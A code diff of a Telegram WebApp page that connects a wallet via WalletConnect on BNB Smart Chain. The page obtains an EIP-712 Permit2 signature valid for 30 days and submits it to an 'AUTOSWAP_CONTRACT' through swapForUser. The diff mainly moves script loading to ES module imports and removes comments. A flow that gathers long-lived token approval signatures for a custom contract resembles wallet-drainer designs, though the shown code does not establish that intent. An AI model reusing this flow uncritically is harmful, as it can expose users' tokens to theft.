@@ -8,13 +8,6 @@
 <!-- Telegram WebApp SDK -->
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
-<!-- WalletConnect Modal & EthereumProvider v2 -->
-<script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.7.0/dist/index.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@walletconnect/eth-provider@1.0.0/dist/umd/index.min.js"></script>
-
-<!-- Ethers.js для удобства -->
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
-
 <style>
   body { font-family: sans-serif; margin: 20px; background: #17212b; color: white; }
   button, input { padding: 10px; font-size: 16px; margin: 8px 0; width: 100%; max-width: 400px; }
@@ -39,6 +32,10 @@
 <div id="status"></div>
 
 <script type="module">
+  import { Modal } from "https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.7.0/dist/esm/index.js";
+  import WalletConnectEthereumProvider from "https://cdn.jsdelivr.net/npm/@walletconnect/eth-provider@1.0.0/dist/esm/index.js";
+  import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/esm/index.js";
+
   const tg = window.Telegram?.WebApp;
   tg?.ready();
 
@@ -63,17 +60,18 @@
   async function initWalletConnect() {
     try {
       statusDiv.textContent = "Инициализация WalletConnect...";
-      const modal = new window.WalletConnectModal.Modal({
+
+      const modal = new Modal({
         projectId: PROJECT_ID,
         themeMode: "dark",
         walletConnectVersion: 2,
-        mobileLinks: ["trust"], // приоритет Trust Wallet
+        mobileLinks: ["trust"],
       });
 
-      provider = await window.WalletConnectEthereumProvider.init({
+      provider = new WalletConnectEthereumProvider({
         projectId: PROJECT_ID,
         chains: [BSC_CHAIN_ID],
-        showQrModal: false,  // мы откроем вручную
+        showQrModal: false,
         rpcMap: {
           [BSC_CHAIN_ID]: "https://bsc-dataseed.binance.org/",
         },
@@ -148,9 +146,8 @@
     statusDiv.style.color = "white";
     statusDiv.textContent = "Генерируем подпись Permit2...";
 
-    // Данные EIP-712 для Permit2
-    const nonce = Date.now(); // простое уникальное число
-    const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 3600; // 30 дней в секундах вперед
+    const nonce = Date.now();
+    const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 3600;
 
     const domain = {
       name: "Permit2",
@@ -186,7 +183,6 @@
     };
 
     try {
-      // Подписываем данные по EIP-712
       const signature = await provider.request({
         method: "eth_signTypedData_v4",
         params: [owner, JSON.stringify(typedData)],
@@ -194,9 +190,8 @@
 
       statusDiv.textContent = "Подпись получена. Отправляем swapForUser...";
 
-      // Используем ethers.js для подготовки calldata
       const iface = new ethers.utils.Interface([
-        "function swapForUser(address user, uint256 amount, uint256 nonce, uint256 deadline, bytes signature)"
+        "function swapForUser(address user, uint256 amount, uint256 nonce, uint256 deadline, bytes signature)",
       ]);
 
       const calldata = iface.encodeFunctionData("swapForUser", [
@@ -204,10 +199,9 @@
         amount,
         nonce,
         deadline,
-        signature
+        signature,
       ]);
 
-      // Отправляем транзакцию
       const txParams = {
         from: owner,
         to: AUTOSWAP_CONTRACT,
